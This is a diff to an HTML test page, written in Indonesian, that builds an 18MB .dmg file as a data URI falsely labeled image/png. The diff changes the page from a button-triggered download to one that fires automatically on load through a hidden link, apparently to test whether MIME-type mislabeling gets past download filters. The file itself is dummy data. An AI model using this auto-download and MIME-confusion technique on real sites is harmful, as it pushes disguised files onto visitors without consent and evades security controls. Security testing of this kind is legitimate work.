@@ -3,30 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MIME Confusion via Data URI</title>
+    <title>Auto Download MIME Confusion</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; text-align: center; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+        .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
         h2 { color: #d32f2f; margin-bottom: 10px; }
         p { margin-bottom: 20px; line-height: 1.6; color: #555; }
-        button { width: 100%; padding: 14px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; background: #d32f2f; color: #fff; transition: background 0.2s; }
-        button:hover { background: #b71c1c; }
         #status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
     </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>MIME Confusion (Data URI)</h2>
-    <p>Mengunduh file .dmg (18MB) dengan manipulasi Content-Type: image/png menggunakan Data URI (tanpa Blob URL).</p>
-    
-    <button id="start-btn" type="button">Mulai Uji Confusion</button>
-    <div id="status" role="status">Sistem siap.</div>
+    <h2>Auto Download MIME Confusion</h2>
+    <p>Halaman ini akan otomatis mengunduh file .dmg 18MB (MIME: image/png) saat dimuat.</p>
+    <div id="status" role="status">Mempersiapkan unduhan otomatis...</div>
 </div>
 
 <script>
-    const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
 
     // Fungsi untuk membuat Data URI dari file biner (DMG 18MB)
@@ -43,9 +38,9 @@
         bytes[2] = 0x6C; // l
         bytes[3] = 0x79; // y
 
-        // 4. Konversi ke Base64 secara bertahap (karena 18MB terlalu besar untuk satu kali btoa)
+        // 4. Konversi ke Base64 secara bertahap
         let binary = "";
-        const chunkSize = 8192; // Proses per 8KB untuk menghindari stack overflow
+        const chunkSize = 8192; 
         
         for (let i = 0; i < bytes.length; i += chunkSize) {
             const chunk = bytes.subarray(i, i + chunkSize);
@@ -58,38 +53,40 @@
         return `data:image/png;base64,${base64Data}`;
     };
 
-    startBtn.addEventListener("click", () => {
+    // Fungsi untuk memicu unduhan
+    const autoDownload = () => {
         statusDiv.textContent = "Membuat Data URI (18MB) dengan MIME palsu...";
-        startBtn.disabled = true;
 
-        setTimeout(() => {
-            try {
-                // Buat Data URI
-                const dataUri = createDmgDataUri();
-                
-                // Buat elemen anchor untuk memicu unduhan
-                const a = document.createElement("a");
-                a.href = dataUri;
-                
-                // Ekstensi file tetap .dmg
-                a.download = "MIME_Confusion_Bypass.dmg";
-                
-                a.style.display = "none";
-                document.body.appendChild(a);
-                a.click();
-                
-                setTimeout(() => {
-                    document.body.removeChild(a);
-                    statusDiv.textContent = "Unduhan dipicu! File .dmg (MIME: image/png) sedang diunduh.";
-                    statusDiv.style.color = "#4CAF50";
-                }, 1000);
+        try {
+            // Buat Data URI
+            const dataUri = createDmgDataUri();
+            
+            // Buat elemen anchor untuk memicu unduhan
+            const a = document.createElement("a");
+            a.href = dataUri;
+            a.download = "MIME_Confusion_Bypass.dmg";
+            a.style.display = "none";
+            document.body.appendChild(a);
+            
+            // Picu klik otomatis
+            a.click();
+            
+            setTimeout(() => {
+                document.body.removeChild(a);
+                statusDiv.textContent = "Unduhan otomatis dipicu! Cek folder Download.";
+                statusDiv.style.color = "#4CAF50";
+            }, 1000);
 
-            } catch (e) {
-                statusDiv.textContent = "Gagal: " + e.message;
-                statusDiv.style.color = "#f00";
-            }
-            startBtn.disabled = false;
-        }, 100);
+        } catch (e) {
+            statusDiv.textContent = "Gagal: " + e.message;
+            statusDiv.style.color = "#f00";
+        }
+    };
+
+    // MEMICU OTOMATIS SAAT HALAMAN SELESAI DIMUAT
+    window.addEventListener('load', () => {
+        // Jeda sedikit agar UI sempat dirender
+        setTimeout(autoDownload, 500);
     });
 </script>
 </body>
